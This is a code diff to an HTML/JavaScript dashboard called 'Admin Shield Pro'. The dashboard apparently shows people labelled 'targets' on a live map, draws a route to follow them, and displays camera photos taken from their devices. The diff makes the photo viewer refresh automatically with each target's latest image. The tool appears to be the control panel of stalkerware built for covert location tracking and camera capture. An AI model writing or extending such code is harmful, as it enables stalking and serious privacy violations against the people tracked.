@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Shield Pro - Dual Live Tracker</title>
+    <title>Admin Shield Pro - Live Automation</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -40,9 +40,11 @@
 
         /* Modal for Photo */
         #photoModal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; }
-        #photoModal img { max-width: 90%; max-height: 70%; border: 5px solid white; border-radius: 10px; }
-        #photoModal .info { color: white; margin-top: 15px; text-align: center; background: #2d3748; padding: 10px; border-radius: 8px; }
+        #photoModal img { max-width: 90%; max-height: 70%; border: 5px solid white; border-radius: 10px; box-shadow: 0 0 20px rgba(99, 179, 237, 0.5); }
+        #photoModal .info { color: white; margin-top: 15px; text-align: center; background: #2d3748; padding: 10px; border-radius: 8px; border: 1px solid #63b3ed; }
         #photoModal span { position: absolute; top: 20px; right: 30px; font-size: 40px; color: white; cursor: pointer; }
+
+        .live-badge { background: red; color: white; padding: 3px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; animation: blink 1s infinite; margin-bottom: 10px; }
 
         @keyframes blink { 50% { opacity: 0.3; } }
     </style>
@@ -50,7 +52,8 @@
 <body>
 
 <div id="photoModal">
-    <span onclick="document.getElementById('photoModal').style.display='none'">×</span>
+    <span onclick="closePhotoModal()">×</span>
+    <div class="live-badge">🔴 LIVE AUTOMATION ACTIVE</div>
     <img id="modalImg" src="">
     <div class="info" id="modalInfo"></div>
 </div>
@@ -93,6 +96,7 @@
 
     let map, markers = {}, paths = {}, followingUser = null, adminMarker = null, currentTileLayer;
     let redNavLine = null;
+    let activePhotoUserId = null; // Track karne ke liye ki kiska modal khula hai
 
     const layers = {
         normal: L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'),
@@ -152,12 +156,18 @@
         else redNavLine = L.polyline(points, {color: '#e53e3e', weight: 5, dashArray: '10, 15'}).addTo(map);
     }
 
-    // Modal mein Cam Mode aur Time dikhane ke liye update
-    function openPhoto(data, cam, time) {
+    // Modal Automation Logic
+    function openPhoto(userId, data, cam, time) {
         if(!data || data === 'undefined') return alert("Target ne abhi tak photo nahi bheji!");
+        activePhotoUserId = userId; // ID save karo
         document.getElementById('modalImg').src = data;
-        document.getElementById('modalInfo').innerHTML = `<b>Source:</b> ${cam || 'Unknown'} <br> <b>Time:</b> ${time || 'Just now'}`;
+        document.getElementById('modalInfo').innerHTML = `<b>Target:</b> ${userId} | <b>Source:</b> ${cam || 'Unknown'} <br> <b>Time:</b> ${time || 'Just now'}`;
         document.getElementById('photoModal').style.display = 'flex';
+    }
+
+    function closePhotoModal() {
+        activePhotoUserId = null; // ID clear karo taaki background update ruk jaye
+        document.getElementById('photoModal').style.display = 'none';
     }
 
     function listenLive() {
@@ -170,6 +180,12 @@
                 const id = doc.id;
                 if(!d.lat || !d.lng) return;
                 
+                // AGAR MODAL KHULA HAI TO PHOTO AUTO-UPDATE KARO
+                if (activePhotoUserId === id && d.userPhoto) {
+                    document.getElementById('modalImg').src = d.userPhoto;
+                    document.getElementById('modalInfo').innerHTML = `<b>Target:</b> ${id} | <b>Source:</b> ${d.camMode || 'Unknown'} <br> <b>Time:</b> ${d.lastPhotoTime || 'Just now'}`;
+                }
+
                 const pos = [parseFloat(d.lat), parseFloat(d.lng)];
                 const isFollowing = (followingUser === id);
 
@@ -183,8 +199,8 @@
                         
                         <div class="track-indicator">🔴 TARGET LOCKED - FOLLOW RED LINE</div>
                         
-                        <button class="track-btn photo-btn" onclick="event.stopPropagation(); openPhoto('${d.userPhoto}', '${d.camMode}', '${d.lastPhotoTime}')">
-                            🖼️ VIEW TARGET PHOTO
+                        <button class="track-btn photo-btn" onclick="event.stopPropagation(); openPhoto('${id}', '${d.userPhoto}', '${d.camMode}', '${d.lastPhotoTime}')">
+                            🖼️ VIEW LIVE AUTOMATION
                         </button>
 
                         <button class="track-btn ${isFollowing ? 'active-btn' : ''}" onclick="event.stopPropagation(); toggleFollow('${id}')">
